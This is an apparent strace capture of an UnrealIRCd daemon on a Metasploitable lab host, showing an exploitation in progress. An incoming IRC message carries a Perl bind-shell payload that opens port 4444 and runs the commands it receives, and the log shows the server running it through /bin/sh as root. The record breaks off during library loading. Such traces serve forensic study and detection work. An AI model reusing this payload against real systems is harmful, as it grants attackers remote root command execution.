4519  07:29:44.113642 select(1024, [2 3 4 7 9], [], NULL, {0, 210000}) = 1 (in [4], left {0, 150000})
4519  07:29:44.168311 clock_gettime(CLOCK_MONOTONIC, {2193, 985320017}) = 0
4519  07:29:44.168311 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 70
4519  07:29:44.168311 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168315 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168330 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168344 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168357 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168372 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168385 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168399 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168412 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168425 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168439 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168452 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168465 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168478 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168491 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168505 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168518 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168531 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168545 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168558 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168586 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168626 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 380000}, ...}) = 0
4519  07:29:44.168657 gettimeofday({1495625384, 168661}, NULL) = 0
4519  07:29:44.168669 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:29:44.168709 clock_gettime(CLOCK_MONOTONIC, {2193, 985722616}) = 0
4519  07:29:44.168722 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:29:44.168739 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:29:44.168760 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:29:44.168776 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:29:44.168809 close(5)          = 0
4519  07:29:44.168827 time(NULL)        = 1495625384
4519  07:29:44.168837 time(NULL)        = 1495625384
4519  07:29:44.168850 gettimeofday({1495625384, 168854}, NULL) = 0
4519  07:29:44.168862 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:29:44.168890 clock_gettime(CLOCK_MONOTONIC, {2193, 985902676}) = 0
4519  07:29:44.168900 gettimeofday({1495625384, 168904}, NULL) = 0
4519  07:29:44.168910 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {0, 860000})
4519  07:29:44.313185 clock_gettime(CLOCK_MONOTONIC, {2194, 130205923}) = 0
4519  07:29:44.313206 accept(2, 0, NULL) = 5
4519  07:29:44.313228 getpeername(5, {sa_family=AF_INET, sin_port=htons(36815), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:29:44.313293 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:29:44.313328 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:29:44.313358 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:29:44.313385 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:29:44.313412 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:29:44.313424 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:29:44.313436 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:29:44.313453 clock_gettime(CLOCK_MONOTONIC, {2194, 130466711}) = 0
4519  07:29:44.313465 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:29:44.313478 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:29:44.313487 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:29:44.313497 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:29:44.313507 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:29:44.313523 send(6, ",u\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:29:44.313613 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:29:44.313662 gettimeofday({1495625384, 313666}, NULL) = 0
4519  07:29:44.313694 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {0, 990000})
4519  07:29:44.321511 clock_gettime(CLOCK_MONOTONIC, {2194, 138531069}) = 0
4519  07:29:44.321531 recvfrom(6, ",u\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\0\271\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:29:44.321646 close(6)          = 0
4519  07:29:44.321680 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:29:44.321694 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:29:44.321753 time(NULL)        = 1495625384
4519  07:29:44.321766 time(NULL)        = 1495625384
4519  07:29:44.321833 gettimeofday({1495625384, 321837}, NULL) = 0
4519  07:29:44.321861 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:29:44.321891 clock_gettime(CLOCK_MONOTONIC, {2194, 138904632}) = 0
4519  07:29:44.321917 gettimeofday({1495625384, 321920}, NULL) = 0
4519  07:29:44.321942 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 0 (Timeout)
4519  07:29:45.318445 clock_gettime(CLOCK_MONOTONIC, {2195, 135479763}) = 0
4519  07:29:45.318483 gettimeofday({1495625385, 318487}, NULL) = 0
4519  07:29:45.318495 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:29:45.318537 clock_gettime(CLOCK_MONOTONIC, {2195, 135549752}) = 0
4519  07:29:45.318549 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:29:45.318578 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:29:45.318596 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:29:45.318608 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:29:45.318624 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 9762
9762  07:29:45.318706 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
9762  07:29:45.318720 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
9762  07:29:45.318731 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9762  07:29:45.318744 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
9762  07:29:45.318901 brk(0)            = 0x80f9000
9762  07:29:45.318924 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.318940 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eef000
9762  07:29:45.318957 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.318981 open("/etc/ld.so.cache", O_RDONLY) = 1
9762  07:29:45.318994 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9762  07:29:45.319012 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee7000
9762  07:29:45.319023 close(1)          = 0
9762  07:29:45.319033 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.319049 open("/lib/libncurses.so.5", O_RDONLY) = 1
9762  07:29:45.319062 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
9762  07:29:45.319155 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
9762  07:29:45.319172 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eb7000
9762  07:29:45.319184 mmap2(0xb7ee4000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7ee4000
9762  07:29:45.319201 close(1)          = 0
9762  07:29:45.319213 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.319227 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
9762  07:29:45.319241 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
9762  07:29:45.319464 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
9762  07:29:45.319481 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7eb3000
9762  07:29:45.319493 mmap2(0xb7eb5000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7eb5000
9762  07:29:45.319509 close(1)          = 0
9762  07:29:45.319520 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.319534 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
9762  07:29:45.319548 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
9762  07:29:45.319639 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
9762  07:29:45.319656 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eb2000
9762  07:29:45.319670 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d63000
9762  07:29:45.319681 mmap2(0xb7eac000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7eac000
9762  07:29:45.319696 mmap2(0xb7eaf000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7eaf000
9762  07:29:45.319709 close(1)          = 0
9762  07:29:45.319731 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d62000
9762  07:29:45.319743 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d626b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
9762  07:29:45.319798 mprotect(0xb7eac000, 4096, PROT_READ) = 0
9762  07:29:45.319835 munmap(0xb7ee7000, 29913) = 0
9762  07:29:45.319861 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9762  07:29:45.319866 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
9762  07:29:45.319881 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe037c0) = -1 ENOTTY (Inappropriate ioctl for device)
9762  07:29:45.319910 brk(0)            = 0x80f9000
9762  07:29:45.319919 brk(0x80fa000)    = 0x80fa000
9762  07:29:45.319931 brk(0x80fb000)    = 0x80fb000
9762  07:29:45.319948 getuid32()        = 0
9762  07:29:45.319957 getgid32()        = 0
9762  07:29:45.319966 geteuid32()       = 0
9762  07:29:45.319975 getegid32()       = 0
9762  07:29:45.319988 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9762  07:29:45.320002 time(NULL)        = 1495625385
9762  07:29:45.320015 brk(0x80fc000)    = 0x80fc000
9762  07:29:45.320029 brk(0x80fd000)    = 0x80fd000
9762  07:29:45.320048 open("/proc/meminfo", O_RDONLY) = 1
9762  07:29:45.320069 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
9762  07:29:45.320087 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eee000
9762  07:29:45.320099 read(1, "MemTotal:      1035240 kB\nMemFree:        447244 kB\nBuffers:         73792 kB\nCached:         355352 kB\nSwapCached:          0 kB\nActive:         255944 kB\nInactive:       302128 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        447004 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            4576 kB\nWriteback:           0 kB\nAnonPages:      128980 kB\nMapped:          52016 kB\nSlab:            18612 kB\nSReclaimable:    10120 kB\nSUnreclaim:       8492 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
9762  07:29:45.320181 close(1)          = 0
9762  07:29:45.320192 munmap(0xb7eee000, 4096) = 0
9762  07:29:45.320204 brk(0x80fe000)    = 0x80fe000
9762  07:29:45.320234 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
9762  07:29:45.320247 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
9762  07:29:45.320259 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
9762  07:29:45.320282 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
9762  07:29:45.320297 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
9762  07:29:45.320336 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
9762  07:29:45.320367 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9762  07:29:45.320378 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
9762  07:29:45.320391 uname({sys="Linux", node="metasploitable", ...}) = 0
9762  07:29:45.320438 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
9762  07:29:45.320456 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
9762  07:29:45.320475 brk(0x8100000)    = 0x8100000
9762  07:29:45.320486 getcwd("/etc/unreal", 4096) = 12
9762  07:29:45.320500 getpid()          = 9762
9762  07:29:45.320517 getppid()         = 4519
9762  07:29:45.320532 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
9762  07:29:45.320551 stat64("/sbin/sh", 0xbfe03798) = -1 ENOENT (No such file or directory)
9762  07:29:45.320564 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
9762  07:29:45.320581 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
9762  07:29:45.320604 socket(PF_FILE, SOCK_STREAM, 0) = 1
9762  07:29:45.320617 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
9762  07:29:45.320629 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9762  07:29:45.320650 close(1)          = 0
9762  07:29:45.320662 socket(PF_FILE, SOCK_STREAM, 0) = 1
9762  07:29:45.320671 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
9762  07:29:45.320682 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9762  07:29:45.320699 close(1)          = 0
9762  07:29:45.320712 open("/etc/nsswitch.conf", O_RDONLY) = 1
9762  07:29:45.320727 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
9762  07:29:45.320743 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eee000
9762  07:29:45.320754 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
9762  07:29:45.320859 read(1, "", 4096) = 0
9762  07:29:45.320870 close(1)          = 0
9762  07:29:45.320880 munmap(0xb7eee000, 4096) = 0
9762  07:29:45.320897 open("/etc/ld.so.cache", O_RDONLY) = 1
9762  07:29:45.320910 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
9762  07:29:45.320940 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7ee7000
9762  07:29:45.320950 close(1)          = 0
9762  07:29:45.320961 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.320976 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
9762  07:29:45.320990 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
9762  07:29:45.321081 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
9762  07:29:45.321098 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d59000
9762  07:29:45.321110 mmap2(0xb7d60000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d60000
9762  07:29:45.321127 close(1)          = 0
9762  07:29:45.321139 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
9762  07:29:45.321152 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
9762  07:29:45.321166 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 